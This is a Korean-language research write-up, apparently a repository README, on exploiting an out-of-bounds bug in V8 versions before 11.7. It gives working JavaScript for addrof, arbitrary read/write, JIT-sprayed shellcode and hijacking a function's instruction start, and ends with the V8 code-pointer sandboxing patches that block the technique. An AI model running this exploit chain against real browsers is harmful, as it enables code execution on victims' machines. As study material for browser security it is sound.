# V8 OOB Exploitation (Chromium < 117.0.5938.62, V8 < 11.7.153)

## Setup

- Ubuntu 22.04.5 LTS (WSL)
- [423eb073e250a43f19912d4418e4cfc3b078b170](https://chromium.googlesource.com/v8/v8/+/423eb073e250a43f19912d4418e4cfc3b078b170) (2023.06.09.)

[oob.diff](./oob.diff)는 out of bounds 버그가 발생한 상황을 simulate하기 위해 array의 length를 임의로 더 크게 설정해도 array가 확장되지 않도록 하고, [dcheck.diff](./dcheck.diff)는 debug build에서 exploit을 진행할 때 crash가 발생하지 않도록 debug check를 제거한다.

[setup.sh](./setup.sh)

## Exploitation

### Generate OOB array

```js
// flags: --allow-natives-syntax --shell

let oob_arr = [1.1];

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${oob_arr.length}`);

% DebugPrint(oob_arr);
```

![image](https://github.com/user-attachments/assets/925de31b-7184-4cc9-9381-a205184503fe)

![image](https://github.com/user-attachments/assets/ff68d071-6978-4baf-9762-8e9c6b26321d)

![image](https://github.com/user-attachments/assets/35204436-ff4a-48fb-8351-071e5d7d8375)

### Helper functions

```js
let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}
```

### Get address of arbitrary object

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(obj_arr);
```

함수 내부에서 `oob_arr`과 `obj_arr`을 연속해서 정의하면 메모리 상에서 인접한 위치에 할당된다. 따라서 `oob_arr`을 통해 `obj_arr`의 메모리에 접근하여 값을 읽고 쓸 수 있다.

![image](https://github.com/user-attachments/assets/20885356-f8ba-4848-b8ea-c8a1a3576586)

![image](https://github.com/user-attachments/assets/2ba285db-3d5c-4650-b444-ac55769a4e60)

![image](https://github.com/user-attachments/assets/0af81a9d-aa51-4058-ab88-374537c5ab75)

```js
// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
```

![image](https://github.com/user-attachments/assets/be5523e6-08c7-4708-beba-9ac98aad3668)

### Arbitrary address read/write

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/b6d7e36f-ae3f-42ba-a53f-1c04d2a4cd22)

![image](https://github.com/user-attachments/assets/df084044-3ba0-4724-832a-76acace4530f)

![image](https://github.com/user-attachments/assets/bccaf9d6-f0c1-492e-a189-597e1a839fd0)

OOB를 이용하여 `TypedArray`의 `base_pointer`를 조작하면 sandbox 내부의 임의의 주소에 접근하여 값을 읽거나 쓸 수 있다.

```js
// aar test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/507f62a6-008c-4ef2-b163-a7ee27d0aba8)

![image](https://github.com/user-attachments/assets/41e77f18-f55b-4bdb-829d-80c0c13f3961)

```js
// aaw test
aarw(tmp_obj_addr - 1n, 0x4141414141414141n);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/43628197-675c-4448-acff-fb3042e202dd)

![image](https://github.com/user-attachments/assets/8f2cdfb8-9c6e-4048-8641-2d25fff0bda3)

### Execute shellcode - JIT spraying

```js
function jit() {
    return [1.1, 2.2, 3.3, 4.4, 5.5];
}
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization

% DebugPrint(jit);
```

Double number들로 구성된 array를 반환하는 함수 `jit()`를 Turbofan으로 최적화하면, 상수들이 최적화된 코드에 raw number로 삽입된다.

![image](https://github.com/user-attachments/assets/1cd9ceb7-22c6-493b-ad10-ddaaacc40534)

![image](https://github.com/user-attachments/assets/d7f71c68-1848-4736-924d-12f4bdf4d9df)

![image](https://github.com/user-attachments/assets/4f3cd308-1320-443f-84ff-ec756dec7b0f)

이를 이용하여 executable memory에 최대 8바이트의 shellcode를 쓸 수 있고, AAW를 이용하여 `code_entry_point`를 shellcode의 주소로 조작하면 optimize된 함수를 호출했을 때 shellcode가 실행된다. 실행하고자 하는 shellcode가 8바이트보다 길 경우, 마지막 2바이트에 `jmp` instruction을 삽입하여 다음 shellcode로 점프하도록 하면 여러 개의 짧은 shellcode들로 chain을 구성할 수 있다.

[shellcode.py](./shellcode.py)

![image](https://github.com/user-attachments/assets/f72f826c-c3fe-4925-9a60-5335a65811ba)

```js
function jit() {
    return [
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112871410787e-246, // itof(0xceb9050636cb866n)
        1.9711314215434657e-246, // itof(0xceb906163782fb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9616425752617766e-246, // itof(0xceb6e69622f0548n)
        1.9711832695973408e-246, // itof(0xceb9090e7894850n)
        1.971182900582351e-246, // itof(0xceb909090f63148n)
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112653196158e-246, // itof(0xceb9050303ab866n)
        1.9710920957760286e-246, // itof(0xceb903d59414cb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9532382542574046e-246, // itof(0xceb505349440548n)
        1.971183239760578e-246, // itof(0xceb9090e0894850n)
        1.9711128050518315e-246, // itof(0xceb905053db3148n)
        1.971182900255075e-246, // itof(0xceb909090e28948n)
        1.9710902863710406e-246, // itof(0xceb903bb0c03148n)
        -6.828527034370483e-229 // itof(0x909090909090050fn)
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization
```

![image](https://github.com/user-attachments/assets/81e70e43-1ad6-4472-afb7-1eb25d53ea91)

![image](https://github.com/user-attachments/assets/94c14fa5-c1fb-4970-ac7e-e9fb8472dbc3)

`jit()`가 반환하는 array에 중복된 값들이 존재할 경우, 위와 같이 레지스터에 저장했다가 재사용하도록 컴파일되어 shellcode가 작동하지 않는다. 따라서 `nop`의 위치를 옮기거나 코드의 순서를 바꿔서 중복된 값들이 없도록 만들어야 한다.

```js
function jit() {
    return [
        1.9711828996832522e-246, // itof(0xceb909090c03148n)
        1.971112871410787e-246, // itof(0xceb9050636cb866n)
        1.9711314215434657e-246, // itof(0xceb906163782fb8n)
        1.97118242283721e-246, // itof(0xceb909020e0c148n)
        1.9616425752617766e-246, // itof(0xceb6e69622f0548n)
        1.9711832695973408e-246, // itof(0xceb9090e7894850n)
        1.971182900582351e-246, // itof(0xceb909090f63148n)
        1.9711831018987653e-246, // itof(0xceb9090c0314890n) (edited)
        1.971112653196158e-246, // itof(0xceb9050303ab866n)
        1.9710920957760286e-246, // itof(0xceb903d59414cb8n)
        1.9710610293119303e-246, // itof(0xceb9020e0c14890n) (edited)
        1.9532382542574046e-246, // itof(0xceb505349440548n)
        1.971183239760578e-246, // itof(0xceb9090e0894850n)
        1.9711128050518315e-246, // itof(0xceb905053db3148n)
        1.971182900255075e-246, // itof(0xceb909090e28948n)
        1.9710902863710406e-246, // itof(0xceb903bb0c03148n)
        -6.828527034370483e-229 // itof(0x909090909090050fn)
    ];
}
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // optimization
```

이후 `jit()`의 `code_entry_point`를 shellcode의 주소로 덮어쓰고 `jit()`를 호출하면 shellcode가 실행된다.

```js
let jit_addr = addrof(jit); // address of |jit()|
console.log(`[+] jit_addr == ${hex(jit_addr)}`);
let code_addr = aarw(jit_addr - 1n + 0x18n) & 0xffffffffn; // code of |jit()|
console.log(`[+] code_addr == ${hex(code_addr)}`)
let inst_addr = aarw(code_addr - 1n + 0x10n); // instruction_start of |jit()|
console.log(`[+] inst_addr == ${hex(inst_addr)}`);

// overwrite instruction_start of |jit()| with address of shellcode
// aarw(code_addr - 1n + 0x10n, inst_addr + 0x72n); // debug
aarw(code_addr - 1n + 0x10n, inst_addr + 0x5cn); // release

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/8b9f1568-3934-4456-a6f8-547f5bba3b96)

## Patch

> [[sandbox] First step towards sandbox CFI](https://chromium.googlesource.com/v8/v8/+/ee48926106051afb784d8f39c31aab0d2a04823f) (2023.06.09.)
>
> This CL implements very basic code pointer sandboxing to ensure that indirect control-flow transfers inside the sandbox always land on a valid code entrypoint. This is achieved by setting up a dedicated code pointer table (CPT) that contains the code entrypoints and then using CodePointerHandles (i.e., table indices) to reference these entries from inside the sandbox. This is essentially the same mechanism used for the external pointer table (EPT), except that the CPT doesn't use type tags.

```diff
diff --git a/src/objects/code.h b/src/objects/code.h
index f70434e..76f7da2 100644
--- a/src/objects/code.h
+++ b/src/objects/code.h
@@ -84,8 +84,9 @@
       WriteBarrierMode mode = UPDATE_WRITE_BARRIER);
   inline void SetInstructionStartForOffHeapBuiltin(Isolate* isolate_for_sandbox,
                                                    Address entry);
-  inline void SetInstructionStartForSerialization(Isolate* isolate,
-                                                  Address entry);
+  inline CodePointer_t ClearInstructionStartForSerialization(Isolate* isolate);
+  inline void RestoreInstructionStartForSerialization(
+      Isolate* isolate, CodePointer_t previous_value);
   inline void UpdateInstructionStart(Isolate* isolate_for_sandbox,
                                      InstructionStream istream);
 
@@ -316,7 +317,7 @@
   V(kInstructionStreamOffset, kTaggedSize)                                    \
   V(kEndOfStrongFieldsOffset, 0)                                              \
   /* Untagged data not directly visited by GC starts here. */                 \
-  V(kInstructionStartOffset, kSystemPointerSize)                              \
+  V(kInstructionStartOffset, kCodePointerSlotSize)                            \
   /* The serializer needs to copy bytes starting from here verbatim. */       \
   V(kFlagsOffset, kUInt32Size)                                                \
   V(kInstructionSizeOffset, kIntSize)                                         \
```

> [[sandbox] Enable code pointer sandboxing](https://chromium.googlesource.com/v8/v8/+/c8d039b05081b474ef751411a5c76ca01900e49a) (2023.06.11.)

```diff
diff --git a/BUILD.gn b/BUILD.gn
index 5ad9387..ac69196 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -335,7 +335,7 @@
 
   # Enable experimental code pointer sandboxing for the V8 sandbox.
   # Sets -DV8_CODE_POINTER_SANDBOXING
-  v8_code_pointer_sandboxing = false
+  v8_code_pointer_sandboxing = ""
 
   # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.
   # WARNING This will expose builtins that (by design) cause memory corruption.
@@ -558,6 +558,11 @@
                       v8_enable_external_code_space && target_os != "fuchsia"
 }
 
+if (v8_code_pointer_sandboxing == "") {
+  # By default, enable code pointer sandboxing if the sandbox is enabled.
+  v8_code_pointer_sandboxing = v8_enable_sandbox
+}
+
 if (v8_enable_static_roots == "") {
   # Static roots are only valid for builds with pointer compression and a
   # shared read-only heap.
```

Code pointer sandboxing이 enable되어, 이제 function의 `instruction_start`를 직접 조작하여 execution flow를 control할 수 없다.

> [Revert "[sandbox] Enable code pointer sandboxing"](https://chromium.googlesource.com/v8/v8/+/bc795ebd90a5a7c957b644da5fac369eb88aa87a) (2023.06.11.)
>
> [Reland "[sandbox] Enable code pointer sandboxing"](https://chromium.googlesource.com/v8/v8/+/7df23d5163a10a12e4b4262dd4e78cfb7ec97be0) (2023.06.11.)
